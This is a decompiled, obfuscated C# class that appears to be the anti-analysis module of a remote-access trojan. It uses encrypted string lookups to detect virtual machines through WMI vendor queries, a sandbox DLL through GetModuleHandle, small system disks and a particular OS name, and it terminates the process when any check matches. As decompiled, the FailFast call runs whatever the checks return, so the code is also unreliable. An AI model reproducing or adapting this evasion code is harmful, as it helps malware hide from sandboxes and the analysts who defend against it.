using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic.Devices;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace eltZnUpwRizyZ;

internal sealed class ONewRWdEXAy
{
	[NonSerialized]
	internal static GetString _009C;

	public static void TYNCYWXgrUzf()
	{
		if (nwMkyzzhKPXQ() || XbJedhAvYypr() || gINIBECCBljoKv() || ccZxTlULfjDYWI())
		{
			Process.GetCurrentProcess().Kill();
		}
		Environment.FailFast(null);
	}

	private static bool gINIBECCBljoKv()
	{
		try
		{
			long num = 61000000000L;
			if (new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize <= num)
			{
				return true;
			}
		}
		catch
		{
		}
		return false;
	}

	private static bool ccZxTlULfjDYWI()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			if (new ComputerInfo().get_OSFullName().ToLower().Contains(_009C(107402698)))
			{
				return true;
			}
		}
		catch
		{
		}
		return false;
	}

	private static bool nwMkyzzhKPXQ()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		try
		{
			ManagementObjectSearcher val = new ManagementObjectSearcher(_009C(107402693));
			try
			{
				ManagementObjectCollection val2 = val.Get();
				try
				{
					ManagementObjectEnumerator enumerator = val2.GetEnumerator();
					try
					{
						while (enumerator.MoveNext())
						{
							ManagementBaseObject current = enumerator.get_Current();
							string text = current.get_Item(_009C(107402100)).ToString()!.ToLower();
							if ((text == _009C(107402115) && current.get_Item(_009C(107402086)).ToString()!.ToUpperInvariant().Contains(_009C(107402045))) || text.Contains(_009C(107402032)) || current.get_Item(_009C(107402086)).ToString() == _009C(107402055))
							{
								return true;
							}
						}
					}
					finally
					{
						((IDisposable)enumerator)?.Dispose();
					}
				}
				finally
				{
					((IDisposable)val2)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch
		{
		}
		return false;
	}

	private static bool XbJedhAvYypr()
	{
		try
		{
			if (PNiJxWUrEfO(_009C(107402006)).ToInt32() != 0)
			{
				return true;
			}
			return false;
		}
		catch
		{
			return false;
		}
	}

	[DllImport("kernel32.dll", EntryPoint = "GetModuleHandle")]
	public static extern IntPtr PNiJxWUrEfO(string P_0);

	static ONewRWdEXAy()
	{
		Strings.CreateGetStringDelegate(typeof(ONewRWdEXAy));
	}
}
